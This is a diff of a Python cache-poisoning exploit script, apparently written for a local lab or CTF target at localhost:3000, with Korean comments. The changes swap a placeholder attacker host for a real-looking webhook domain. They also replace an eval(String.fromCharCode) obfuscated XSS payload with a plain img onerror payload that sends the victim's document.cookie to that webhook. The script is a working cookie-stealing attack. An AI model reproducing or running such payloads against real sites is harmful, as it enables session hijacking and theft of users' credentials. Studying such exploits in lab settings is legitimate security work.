@@ -6,27 +6,22 @@ import random
 # 1. 설정 (Configuration)
 # ==========================================
 TARGET_HOST = "http://localhost:3000"
-WEBHOOK_URL = "https://attacker_ip/" # 본인의 웹훅 주소
+WEBHOOK_URL = "https://meowyeok.kr/" # 본인의 웹훅 주소
 
+# 캐시 충돌 방지를 위한 랜덤 경로 생성
 random_id = random.randint(10000, 99999)
 RESUME_PATH = f"/resume?name=test{random_id}&title=test{random_id}"
 
-print(f"[*] Starting Cache Poisoning Exploit (No Base64)...")
+print(f"[*] Starting Cache Poisoning Exploit...")
 print(f"[*] Target Fresh Path: {RESUME_PATH}")
 
 # ==========================================
-# 2. XSS 페이로드 생성 (String.fromCharCode)
+# 2. XSS 페이로드 생성
 # ==========================================
 js_code = f"location.href='{WEBHOOK_URL}?c='+document.cookie"
+xss_payload = f"<img src=x onerror={js_code}>"
 
-# 아스키코드(숫자) 배열로 변환
-char_codes = ','.join(str(ord(c)) for c in js_code)
-xss_payload = f"<img src=x onerror=eval(String.fromCharCode({char_codes}))>"
-
-print("")
-print(f"[+] Raw JS Code: {js_code}")
-print(f"[+] Generated XSS Payload: {xss_payload}")
-print("")
+print(f"\n[+] Generated XSS Payload: {xss_payload}\n")
 
 # ==========================================
 # 3. Cache Poisoning
@@ -45,7 +40,7 @@ if response.status_code == 200:
 else:
     print(f"[-] Something went wrong. Status Code: {response.status_code}")
 
-# 캐시가 반영될 시간
+# 캐시가 반영될 시간 대기
 time.sleep(2)
 
 # ==========================================
